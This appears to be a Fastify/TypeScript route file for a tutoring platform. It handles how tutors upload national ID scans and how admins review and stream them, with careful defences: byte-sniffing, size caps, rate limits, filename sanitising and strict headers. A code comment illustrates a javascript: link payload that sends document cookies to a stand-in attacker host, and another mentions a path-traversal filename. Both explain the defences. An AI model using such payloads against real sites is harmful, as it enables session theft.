import type { FastifyInstance } from "fastify";
import { z } from "zod";
import { mkdir, writeFile, readFile } from "node:fs/promises";
import { join } from "node:path";
import {
  eq, inArray, sql as raw,
  tutors, verificationDocs, notify,
  storageBase, resolveDocPath,
} from "@tnajem/db";
import { docKind } from "@tnajem/db";

/** The enum values, derived from the schema rather than re-typed. */
type DocKind = (typeof docKind.enumValues)[number];
import {
  vUuid, vOptionalText, vOptionalUrl, safeFileName, isUuid,
  adminNotifyEmails,
  type PendingTutor, type TutorVerification,
} from "@tnajem/shared";
import { mailEnabled, sendMail } from "@tnajem/shared/mail";
import { db } from "../db";
import { getSession } from "../lib/session";
import { requireAdmin } from "../lib/admin";
import { checkRateLimit } from "../lib/rate-limit";

/* uploads + admin — the most sensitive surface in the product. These endpoints
   accept, store and stream Tunisian national ID cards.

   uploads and admin move TOGETHER because they share STORAGE_DIR, the same
   resolveDocPath containment check, and the admin allowlist. Splitting them would
   have shipped a document route whose gate lived in the other half. */

const MAX_DOC_BYTES = 8 * 1024 * 1024; // 8 MB per file
const MAX_DOCS_PER_TUTOR = 24; // ~4 rounds of the 6 fields — a resubmit budget, not a bucket
const OK_MIME = /^(image\/(jpeg|png|webp|heic|heif)|application\/pdf)$/;

const DOC_FIELDS: { field: string; kind: DocKind; required?: boolean }[] = [
  { field: "idFront", kind: "id_front", required: true },
  { field: "idBack", kind: "id_back" },
  { field: "selfie", kind: "selfie" },
  { field: "diploma", kind: "diploma" },
  { field: "certificate", kind: "certificate" },
  { field: "roleProof", kind: "role_proof" },
];

/* Content sniffing. `File.type` is the Content-Type the CLIENT chose, so it is a
   claim, not a fact — an .exe renamed to .pdf announces application/pdf. These are
   the magic bytes actually on disk. The SNIFFED type is what gets stored; the
   client's claim is never persisted. */
function sniffMime(buf: Buffer): string | null {
  if (buf.length < 12) return null;
  if (buf[0] === 0xff && buf[1] === 0xd8 && buf[2] === 0xff) return "image/jpeg";
  if (
    buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4e && buf[3] === 0x47 &&
    buf[4] === 0x0d && buf[5] === 0x0a && buf[6] === 0x1a && buf[7] === 0x0a
  ) return "image/png";
  if (buf.subarray(0, 5).toString("latin1") === "%PDF-") return "application/pdf";
  if (
    buf.subarray(0, 4).toString("latin1") === "RIFF" &&
    buf.subarray(8, 12).toString("latin1") === "WEBP"
  ) return "image/webp";
  // ISO-BMFF (HEIC/HEIF): bytes 4..8 = "ftyp", brand at 8..12
  if (buf.subarray(4, 8).toString("latin1") === "ftyp") {
    const brand = buf.subarray(8, 12).toString("latin1");
    if (["heic", "heix", "hevc", "heim", "heis", "hevm", "mif1", "msf1"].includes(brand)) {
      return "image/heic";
    }
  }
  return null;
}

/* Content-Type allow-list for the READ path. Anything not on it is served as
   application/octet-stream + attachment, so an unexpected byte stream can never be
   rendered as an active document in the admin's authenticated origin. */
const SAFE_MIME = /^(image\/(jpeg|png|webp|heic|heif)|application\/pdf)$/;

const tutorIdBody = z.object({ tutorId: z.string() });
const rejectBody = z.object({ tutorId: z.string(), note: z.string().optional() });

export async function adminRoutes(app: FastifyInstance): Promise<void> {
  /* ── POST /verification (multipart) ──────────────────────────────────────── */
  app.post("/verification", async (req, reply) => {
    const session = await getSession(req);
    if (!session) return { ok: false, error: "not-authenticated" };
    const [mine] = await db
      .select()
      .from(tutors)
      .where(eq(tutors.profileId, session.profile.id))
      .limit(1);
    if (!mine) return { ok: false, error: "no-storefront" };

    /* Throttle. Each call can write up to 6 × 8 MB and there was NO limit on how
       often it could be called: a signed-in tutor could loop this and fill the
       disk — the same volume the app and every other tutor's documents live on. */
    const rl = await checkRateLimit(`verif:${mine.id}`, 5, 60 * 60_000);
    if (!rl.ok) return { ok: false, error: "too-many-requests", retryAfter: rl.retryAfter };

    /* Hard cap on stored documents per tutor. Rate limiting bounds the RATE; this
       bounds the TOTAL, so a patient attacker cannot drip-feed the disk full over
       days. Rows are only ever removed by the retention purge. */
    const [{ n: docCount } = { n: 0 }] = await db
      .select({ n: raw<number>`count(*)::int` })
      .from(verificationDocs)
      .where(eq(verificationDocs.tutorId, mine.id));

    const incoming: { kind: DocKind; fileName: string; bytes: Buffer; mime: string }[] = [];
    const fields = new Map<string, string>();

    for await (const part of req.parts()) {
      if (part.type === "file") {
        const spec = DOC_FIELDS.find((d) => d.field === part.fieldname);
        if (!spec) {
          await part.toBuffer(); // drain, otherwise the stream stalls
          continue;
        }
        const bytes = await part.toBuffer();

        /* @fastify/multipart TRUNCATES at `limits.fileSize` — it does NOT throw.
           Miss this check and an oversized upload is silently persisted as a
           CUT-OFF national ID scan, which an admin then approves believing they
           looked at a whole document. This is the single easiest way to ship a
           broken verification pipeline, so it is checked first. */
        if (part.file.truncated || bytes.length > MAX_DOC_BYTES) {
          return { ok: false, error: "file-too-large" };
        }
        if (bytes.length === 0) continue;

        // The real gate: what the bytes ACTUALLY are, not what the client claimed.
        const sniffed = sniffMime(bytes);
        if (!sniffed || !OK_MIME.test(sniffed)) return { ok: false, error: "bad-file-type" };

        incoming.push({
          kind: spec.kind,
          fileName: part.filename ?? "document",
          bytes,
          mime: sniffed,
        });
      } else {
        fields.set(part.fieldname, String(part.value ?? ""));
      }
    }

    for (const d of DOC_FIELDS) {
      if (d.required && !incoming.some((i) => i.kind === d.kind)) {
        return { ok: false, error: "id-required" };
      }
    }

    if (docCount + incoming.length > MAX_DOCS_PER_TUTOR) {
      return { ok: false, error: "too-many-documents" };
    }

    /* Persist. Files land under STORAGE_DIR/verification/<tutorId>/ — OUTSIDE any
       public directory, so nothing here is ever served statically; the only reader
       is the admin-gated stream below. `mine.id` comes from the session's own
       tutor row, so a tutor can only ever write into their OWN folder. */
    const dir = join(storageBase(), "verification", mine.id);
    await mkdir(dir, { recursive: true });

    for (const { kind, bytes, mime, fileName } of incoming) {
      /* safeFileName strips directory components and everything outside
         [a-zA-Z0-9._-], so "../../../etc/cron.d/x" and NUL-byte tricks collapse to
         a flat, inert name. */
      const safe = `${kind}-${Date.now()}-${safeFileName(fileName, 60)}`;
      await writeFile(join(dir, safe), bytes);
      await db.insert(verificationDocs).values({
        tutorId: mine.id,
        kind,
        // The SANITIZED name: this string is echoed into a Content-Disposition
        // header by the stream route, and a raw client name could carry CR/LF.
        fileName: safeFileName(fileName, 60),
        // POSIX separators, ALWAYS — node:path.join is platform-dependent.
        storagePath: ["verification", mine.id, safe].join("/"),
        mime, // the SNIFFED type — never the client's claim
        sizeBytes: bytes.length,
      });
    }

    /* Text + link fields. The seven *Url fields land in the tutors row and are
       rendered as <a href> on the ADMIN review page — a tutor submitting
       `javascript:fetch('//evil.tn?c='+document.cookie)` as their "website" would
       be planting a link that fires in the one session that can read every
       national ID scan in the system. vOptionalUrl enforces an http/https scheme
       allow-list, which is what kills javascript:, data: and file:. */
    const textField = (name: string, max: number) =>
      vOptionalText(fields.get(name), { field: name, max });
    const urlField = (name: string) => vOptionalUrl(fields.get(name), { field: name });

    const institution = textField("institution", 120);
    if (!institution.ok) return { ok: false, error: institution.error };
    const languages = textField("languages", 120);
    if (!languages.ok) return { ok: false, error: languages.error };
    const pitch = textField("pitch", 600);
    if (!pitch.ok) return { ok: false, error: pitch.error };

    const linkedin = urlField("linkedinUrl");
    if (!linkedin.ok) return { ok: false, error: linkedin.error };
    const instagram = urlField("instagramUrl");
    if (!instagram.ok) return { ok: false, error: instagram.error };
    const tiktok = urlField("tiktokUrl");
    if (!tiktok.ok) return { ok: false, error: tiktok.error };
    const youtube = urlField("youtubeUrl");
    if (!youtube.ok) return { ok: false, error: youtube.error };
    const facebook = urlField("facebookUrl");
    if (!facebook.ok) return { ok: false, error: facebook.error };
    const website = urlField("websiteUrl");
    if (!website.ok) return { ok: false, error: website.error };
    const introVideo = urlField("introVideoUrl");
    if (!introVideo.ok) return { ok: false, error: introVideo.error };

    const yearsRaw = fields.get("experienceYears");
    const years =
      yearsRaw && yearsRaw.trim()
        ? Math.max(0, Math.min(60, parseInt(yearsRaw, 10) || 0))
        : null;

    await db
      .update(tutors)
      .set({
        status: "pending",
        submittedAt: new Date(),
        reviewNote: null,
        experienceYears: years,
        institution: institution.value,
        languages: languages.value,
        pitch: pitch.value,
        linkedinUrl: linkedin.value,
        instagramUrl: instagram.value,
        tiktokUrl: tiktok.value,
        youtubeUrl: youtube.value,
        facebookUrl: facebook.value,
        websiteUrl: website.value,
        introVideoUrl: introVideo.value,
      })
      .where(eq(tutors.id, mine.id));

    /* Tell a human. Without this the queue was write-only: a tutor uploaded their
       national ID, several screens told them someone would look at it, and no
       signal ever left the database. E-mail rather than notify(): admins are an
       env allow-list, not necessarily profiles with a notifications feed. */
    const to = adminNotifyEmails(process.env);
    if (to.length && mailEnabled()) {
      const subject = `Tnajem — nouvelle demande de vérification : ${mine.fullName}`;
      const body =
        `${mine.fullName} (tnajem.tn/${mine.slug}) a soumis ses documents.\n\n` +
        `File d'attente : /admin/verifications`;
      await Promise.all(to.map((addr) => sendMail(addr, subject, body)));
    } else if (!to.length) {
      req.log.warn(
        { tutorId: mine.id },
        "verification submitted but ADMIN_EMAILS is empty — nobody was alerted",
      );
    }

    return { ok: true };
  });

  /* ── GET /verification/mine ──────────────────────────────────────────────── */
  app.get("/verification/mine", async (req): Promise<TutorVerification | null> => {
    const session = await getSession(req);
    if (!session) return null;
    const [mine] = await db
      .select()
      .from(tutors)
      .where(eq(tutors.profileId, session.profile.id))
      .limit(1);
    if (!mine) return null;

    const docs = await db
      .select()
      .from(verificationDocs)
      .where(eq(verificationDocs.tutorId, mine.id));

    return {
      status: mine.status,
      experienceYears: mine.experienceYears ?? null,
      institution: mine.institution ?? null,
      languages: mine.languages ?? null,
      pitch: mine.pitch ?? null,
      links: {
        linkedin: mine.linkedinUrl ?? null,
        instagram: mine.instagramUrl ?? null,
        tiktok: mine.tiktokUrl ?? null,
        youtube: mine.youtubeUrl ?? null,
        facebook: mine.facebookUrl ?? null,
        website: mine.websiteUrl ?? null,
        introVideo: mine.introVideoUrl ?? null,
      },
      reviewNote: mine.reviewNote ?? null,
      docKinds: docs.map((d) => d.kind),
    };
  });

  /* ── GET /admin/verifications ────────────────────────────────────────────── */
  app.get("/admin/verifications", async (req) => {
    const session = await requireAdmin(req);
    if (!session) return { ok: false, admin: false, items: [] as PendingTutor[] };

    /* Bounded: the review queue is a work list, not an export. Oldest first so
       nobody's application is starved at the bottom of an unbounded scan. */
    const rows = await db
      .select()
      .from(tutors)
      .where(eq(tutors.status, "pending"))
      .orderBy(tutors.submittedAt)
      .limit(100);
    if (rows.length === 0) return { ok: true, admin: true, items: [] as PendingTutor[] };

    /* N+1 (fixed): this ran one verification_docs SELECT per pending tutor. At 100
       applications that was 101 round-trips for one page load. */
    const allDocs = await db
      .select()
      .from(verificationDocs)
      .where(inArray(verificationDocs.tutorId, rows.map((t) => t.id)));

    const docsByTutor = new Map<string, typeof allDocs>();
    for (const d of allDocs) {
      const list = docsByTutor.get(d.tutorId);
      if (list) list.push(d);
      else docsByTutor.set(d.tutorId, [d]);
    }

    const items: PendingTutor[] = rows.map((t) => ({
      tutorId: t.id,
      slug: t.slug,
      name: t.fullName,
      subject: t.subject,
      experienceYears: t.experienceYears ?? null,
      institution: t.institution ?? null,
      languages: t.languages ?? null,
      pitch: t.pitch ?? null,
      links: {
        linkedin: t.linkedinUrl ?? null,
        instagram: t.instagramUrl ?? null,
        tiktok: t.tiktokUrl ?? null,
        youtube: t.youtubeUrl ?? null,
        facebook: t.facebookUrl ?? null,
        website: t.websiteUrl ?? null,
        introVideo: t.introVideoUrl ?? null,
      },
      submittedAt: t.submittedAt ? t.submittedAt.toISOString() : null,
      docs: (docsByTutor.get(t.id) ?? []).map((d) => ({
        id: d.id,
        kind: d.kind,
        fileName: d.fileName,
      })),
    }));

    return { ok: true, admin: true, items };
  });

  /* ── POST /admin/verifications/approve ───────────────────────────────────── */
  app.post("/admin/verifications/approve", async (req, reply) => {
    const parsed = tutorIdBody.safeParse(req.body);
    if (!parsed.success) return reply.code(400).send({ error: "bad-request" });

    const session = await requireAdmin(req);
    if (!session) return { ok: false, error: "forbidden" };

    const tutorId = vUuid(parsed.data.tutorId, { field: "tutor" });
    if (!tutorId.ok) return { ok: false, error: "not-found" };

    const [t] = await db.select().from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
    if (!t) return { ok: false, error: "not-found" };

    /* Separation of duties: an admin who also runs a tutor storefront must not be
       able to verify their OWN identity documents. A second admin signs it off. */
    if (t.profileId && t.profileId === session.profile.id) {
      return { ok: false, error: "self-approval-forbidden" };
    }
    // Only a SUBMITTED application can be approved — otherwise a draft tutor who
    // never uploaded an ID could be waved through by a misclick.
    if (t.status !== "pending") return { ok: false, error: "not-pending" };

    await db
      .update(tutors)
      .set({ status: "verified", verified: true, reviewedAt: new Date(), reviewNote: null })
      .where(eq(tutors.id, tutorId.value));

    if (t.profileId) {
      await notify(db, t.profileId, {
        kind: "verification_approved",
        title: "Profil vérifié ✅",
        body: "Ton profil est validé. Ta page est en ligne et visible dans Explorer.",
        href: "/dashboard",
        sms: `Tnajem : ton profil est vérifié ✅ Ta page tnajem.tn/${t.slug} est en ligne.`,
      });
    }

    /* The decision must be effective NOW, not in up to 60s (storefront) or an hour
       (sitemap). On approve that is a UX win; on reject it is a compliance
       control. The web replays both from this envelope. */
    return { ok: true, revalidate: { tutors: [t.slug], publicTutors: true } };
  });

  /* ── POST /admin/verifications/reject ────────────────────────────────────── */
  app.post("/admin/verifications/reject", async (req, reply) => {
    const parsed = rejectBody.safeParse(req.body);
    if (!parsed.success) return reply.code(400).send({ error: "bad-request" });

    const session = await requireAdmin(req);
    if (!session) return { ok: false, error: "forbidden" };

    const note = vOptionalText(parsed.data.note, { field: "note", max: 500 });
    if (!note.ok) return { ok: false, error: note.error };
    const tutorId = vUuid(parsed.data.tutorId, { field: "tutor" });
    if (!tutorId.ok) return { ok: false, error: "not-found" };

    const [t] = await db.select().from(tutors).where(eq(tutors.id, tutorId.value)).limit(1);
    if (!t) return { ok: false, error: "not-found" };

    await db
      .update(tutors)
      .set({ status: "rejected", verified: false, reviewedAt: new Date(), reviewNote: note.value })
      .where(eq(tutors.id, tutorId.value));

    if (t.profileId) {
      await notify(db, t.profileId, {
        kind: "verification_rejected",
        title: "Dossier à compléter",
        body: note.value
          ? `Ton dossier n'a pas été validé : ${note.value}. Tu peux corriger et renvoyer.`
          : "Ton dossier n'a pas été validé. Vérifie tes documents et renvoie ta demande.",
        href: "/onboarding/verify",
        sms: "Tnajem : ton dossier de vérification doit être complété. Détails dans ton espace prof.",
      });
    }

    /* THE COMPLIANCE ONE. The storefront 404s for a non-verified tutor, but the
       page is ISR-cached for 60s and the sitemap for an hour — so without this the
       page of a tutor we have just REJECTED (possibly for a failed ID check, on a
       platform used by minors) keeps being served for another minute and
       advertised for another hour. The TTL is the backstop; this is the control. */
    return { ok: true, revalidate: { tutors: [t.slug], publicTutors: true } };
  });

  /* ── GET /admin/doc/:id — streams a national ID scan ─────────────────────── */
  app.get<{ Params: { id: string } }>("/admin/doc/:id", async (req, reply) => {
    const session = await requireAdmin(req);
    if (!session) return reply.code(403).type("text/plain").send("Forbidden");

    if (!isUuid(req.params.id)) return reply.code(400).type("text/plain").send("Bad request");

    const [doc] = await db
      .select()
      .from(verificationDocs)
      .where(eq(verificationDocs.id, req.params.id))
      .limit(1);
    if (!doc) return reply.code(404).type("text/plain").send("Not found");

    const abs = resolveDocPath(storageBase(), doc.storagePath);
    if (!abs) return reply.code(400).type("text/plain").send("Bad request");

    let bytes: Buffer;
    try {
      bytes = await readFile(abs);
    } catch {
      return reply.code(404).type("text/plain").send("Not found");
    }

    /* Every header below is deliberate. This is the one URL in the product that
       returns a Tunisian national ID card.
         - Content-Type from the allow-list ONLY; anything else is octet-stream +
           attachment, so an unexpected byte stream cannot render as an active
           document inside the admin's authenticated origin.
         - CSP default-src 'none' + sandbox: even a crafted SVG/HTML cannot run.
         - nosniff: stops the browser second-guessing the type.
         - no-store: an ID scan must not sit in a disk cache.
         - The filename is already sanitised at write time (CR/LF header injection). */
    const safeType = SAFE_MIME.test(doc.mime ?? "") ? (doc.mime as string) : "application/octet-stream";
    const disposition = safeType === "application/octet-stream" ? "attachment" : "inline";

    return reply
      .header("content-type", safeType)
      .header("content-disposition", `${disposition}; filename="${safeFileName(doc.fileName, 60)}"`)
      .header("content-security-policy", "default-src 'none'; img-src 'self'; object-src 'none'; sandbox")
      .header("x-content-type-options", "nosniff")
      .header("cache-control", "private, no-store, max-age=0")
      .header("referrer-policy", "no-referrer")
      .send(bytes);
  });
}
